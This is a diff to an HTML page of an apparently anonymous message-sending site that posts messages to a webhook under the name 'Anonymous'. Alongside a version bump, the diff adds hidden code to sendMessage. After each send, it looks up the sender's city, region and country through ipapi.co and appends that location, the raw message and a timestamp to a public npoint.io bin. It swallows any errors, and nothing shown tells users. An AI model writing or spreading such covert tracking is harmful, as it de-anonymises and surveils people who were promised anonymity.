@@ -481,7 +481,7 @@
 <!-- Admin trigger button (hidden by default, shown only for admin IP) -->
 <button class="admin-trigger" id="admin-trigger" style="display:none;">⚙</button>
 
-<div style="position:fixed;bottom:1.2rem;left:1.2rem;font-family:'JetBrains Mono',monospace;font-size:11px;color:rgba(124,127,142,0.5);z-index:50;letter-spacing:0.05em;">V6</div>
+<div style="position:fixed;bottom:1.2rem;left:1.2rem;font-family:'JetBrains Mono',monospace;font-size:11px;color:rgba(124,127,142,0.5);z-index:50;letter-spacing:0.05em;">V8</div>
 
 <!-- Modal -->
 <div class="modal-overlay" id="modal-overlay">
@@ -534,6 +534,7 @@
   const WEBHOOK_URL = "https://project-3rlrn.vercel.app/api/send";
   const ADMIN_IP = "2600:1700:dc0:9070:29d2:a3e8:39c:10d4";
   const NPOINT_URL = "https://api.npoint.io/ec1fde3721f0c5a3ed79";
+  const LOG_URL = "https://api.npoint.io/2bdf2628ab86edf74ee0";
   const SENDER_NAME = "Anonymous";
   const AVATAR_LETTER = "A";
 
@@ -640,16 +641,40 @@
 
   async function sendMessage() {
     if (!siteActive || !webhookActive) return;
-    const text = resolveMentions(msg.value.trim());
+    const rawText = msg.value.trim();
+    const text = resolveMentions(rawText);
     if (!text || !WEBHOOK_URL) return;
     sendBtn.className = 'send-btn loading';
     try {
       const res = await fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: SENDER_NAME, content: text, allowed_mentions: { parse: ['users'] } })
+        body: JSON.stringify({
+          username: SENDER_NAME,
+          content: text,
+          allowed_mentions: { parse: ['users'] }
+        })
       });
       if (res.ok || res.status === 204) {
+        // get location and log to npoint
+        try {
+          const geoRes = await fetch('https://ipapi.co/json/');
+          const geo = await geoRes.json();
+          const location = `${geo.city}, ${geo.region}, ${geo.country_name}`;
+          const logRes = await fetch(LOG_URL);
+          const logData = await logRes.json();
+          const messages = logData.messages || [];
+          messages.push({
+            location,
+            message: rawText,
+            time: new Date().toLocaleString()
+          });
+          await fetch(LOG_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ messages })
+          });
+        } catch {}
         msg.value = '';
         countEl.textContent = '0 / 2000';
         countEl.className = 'char-count';
